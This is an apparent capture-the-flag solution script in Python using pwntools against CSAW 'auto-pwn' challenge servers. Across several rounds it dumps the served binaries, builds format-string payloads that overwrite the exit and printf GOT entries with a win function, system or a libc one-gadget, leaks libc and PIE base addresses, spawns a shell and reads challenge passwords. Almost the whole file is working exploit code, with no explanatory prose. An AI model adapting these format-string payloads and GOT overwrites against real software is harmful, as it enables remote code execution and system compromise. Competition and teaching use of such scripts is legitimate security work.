#!/usr/bin/python

from pwn import *
import sys

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
# context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop = True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

def get_length(a,b):
    while hex(a)[-4:]!=b:
        a = a + 1
    return a

def fstring_payload32(addr, offset, waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 8:
        addr = addr.rjust(8,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    var2 = get_length(var1,s2) - var1
    payload = "%{}c%{}$hn%{}c%{}$hn".format(var1,offset+6,var2,offset+7).ljust(24,"a")
    payload += p32(waddr) 
    payload += p32(waddr+2)
    return payload

def fstring_payload64(addr, offset, waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 16:
        addr = addr.rjust(16,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    s3 = addr[-12:-8]
    var2 = get_length(var1,s2) - var1
    var3 = get_length(var1 + var2, s3) - var2 - var1
    payload = "%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn".format(var1,offset+5,var2,offset+6,var3,offset+7).ljust(40,"a")
    payload += (p64(waddr) + p64(waddr+2) + p64(waddr+4))
    return payload

def fstring_payload64_v2(addr, offset, waddr, addr2, waddr2):
    addr = hex(addr).replace("0x","")
    if len(addr) < 16:
        addr = addr.rjust(16,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    s3 = addr[-12:-8]
    var2 = get_length(var1, s2) - var1
    var3 = get_length(var1 + var2, s3) - var2 - var1

    addr2 = hex(addr2).replace("0x","")
    if len(addr2) < 16:
        addr2 = addr2.rjust(16,"0")
    s4 = addr2[-4:]
    s5 = addr2[-8:-4]
    s6 = addr2[-12:-8]
    var4 = get_length(var3 + var2 + var1, s4) - var1 - var2 - var3
    var5 = get_length(var4 + var3 + var2 + var1, s5) - var1 - var2 - var3 - var4
    var6 = get_length(var5 + var4 + var3 + var2 + var1, s6) - var1 - var2 - var3 - var4 - var5

    payload = "%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn".format(var1,offset+15,var2,offset+16,var3,offset+17)
    payload += "%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn".format(var4,offset+18,var5,offset+19,var6,offset+20)
    payload = payload.ljust(120,"a")
    payload += (p64(waddr) + p64(waddr+2) + p64(waddr+4))
    payload += (p64(waddr2) + p64(waddr2+2) + p64(waddr2+4))

    return payload

def pwn32(io, password, debug = False):
    sla("> ", password)
    if not debug:
        reu("on this box: \n")
        rl()
        f = io.recvuntil("-------------------------------------------------------------------\n")
        with open("out","w+") as fp:
            fp.write(f)
        os.system("cat out | xxd -r > bin && chmod +x bin")
    e = ELF('bin')
    win = e.symbols['win']
    exit_got = e.got['exit']
    payload = fstring_payload32(win, 6, exit_got)
    sla("> ", payload)
    reu("following:\n")
    sl("cat message.txt")
    reu("box! ")
    log.info(reu("password "))
    data = rl().strip("\n")
    log.info(data)
    return data

def pwn64(io, password, debug = False):
    sla("> ", password)
    if not debug:
        reu("on this box: \n")
        rl()
        f = io.recvuntil("-------------------------------------------------------------------\n")
        with open("out","w+") as fp:
            fp.write(f)
        os.system("cat out | xxd -r > bin && chmod +x bin")
    e = ELF('bin')
    win = e.symbols['win']
    exit_got = e.got['exit']
    payload = fstring_payload64(win, 6, exit_got)
    sla("> ", payload)
    reu("following:\n")
    sl("cat message.txt")
    reu("box! ")
    log.info(reu("password "))
    data = rl().strip("\n")
    log.info(data)
    return data

def pwn64_v2(io, password, debug = False):
    sla("> ", password)
    if not debug:
        reu("on this box: \n")
        rl()
        f = io.recvuntil("-------------------------------------------------------------------\n")
        with open("out","w+") as fp:
            fp.write(f)
        os.system("cat out | xxd -r > bin && chmod +x bin")
    e = ELF('bin')
    system = e.symbols['system']
    exit_got = e.got['exit']
    printf_got = e.got['printf']
    code = 0x401aec
    payload = fstring_payload64_v2(code, 6, exit_got, system, printf_got)
    sla("> ", payload)
    reu("this!\n")
    sl("")
    sl("/bin/sh\x00")
    reu("following:\n")
    sl("cat message.txt")
    reu("box! ")
    log.info(reu("password "))
    data = rl().strip("\n")
    log.info(data)
    return data

def pwn64_v3(io, password, debug = False, finalrun = False):
    sla("> ", password)
    if not debug:
        reu("on this box: \n")
        rl()
        f = io.recvuntil("-------------------------------------------------------------------\n")
        with open("out","w+") as fp:
            fp.write(f)
        os.system("cat out | xxd -r > bin && chmod +x bin")
    sla("> ", "%11$p")
    reu(":\n")
    libc = ELF("./libc.so.6")
    libc.address = int(rl(), 16) - 45 - libc.symbols['_IO_file_write']
    log.info("libc @ "+hex(libc.address))
    gadget = libc.address + 0xe6c81
    sla("> ", "%35$p")
    reu(":\n")
    pie_base = int(rl(), 16) - 0x15a2
    e = ELF('bin')
    log.info("leak @ "+hex(pie_base))
    exit_got = e.got['exit'] + pie_base
    payload = fstring_payload64(gadget, 8, exit_got)
    sla("> ", payload)
    if finalrun:
        io.interactive()
    sl("cat message.txt")
    reu("box! ")
    log.info(reu("password "))
    data = rl().strip("\n")
    log.info(data)
    return data

if __name__ == "__main__":
    '''
    password = "cd80d3cd8a479a18bbc9652f3631c61c"
    for i in range(15):
        io = remote('auto-pwn.chal.csaw.io', 11001+i)
        password = pwn32(io, password)
        io.close()
    for i in range(15):
        io = remote('auto-pwn.chal.csaw.io', 11016+i)
        password = pwn64(io, password)
        io.close()
    password = "676b8b041ae5640ba189fe0fa12a0fe3"
    for i in range(15):
        io = remote('auto-pwn.chal.csaw.io', 11031+i)
        password = pwn64_v2(io, password)
        io.close()
    '''
    password = "e02d9819275a736cdfb5bff2e30f3f50"
    for i in range(4):
        io = remote('auto-pwn.chal.csaw.io', 11046+i)
        password = pwn64_v3(io, password)
        io.close()
    io = remote('auto-pwn.chal.csaw.io', 11050)
    password = pwn64_v3(io, password, finalrun=True)
'''

if __name__ == "__main__":

    # io = process('./bin', env = {"LD_PRELOAD" : "./libc.so"})
    # io = gdb.debug('./bin', 'b*0x555555554000+0x1499', env = {"LD_PRELOAD" : "./libc.so"})
    io = remote('auto-pwn.chal.csaw.io', 11046)
    pwn64_v3(io, 'e02d9819275a736cdfb5bff2e30f3f50')
    io.interactive()
'''
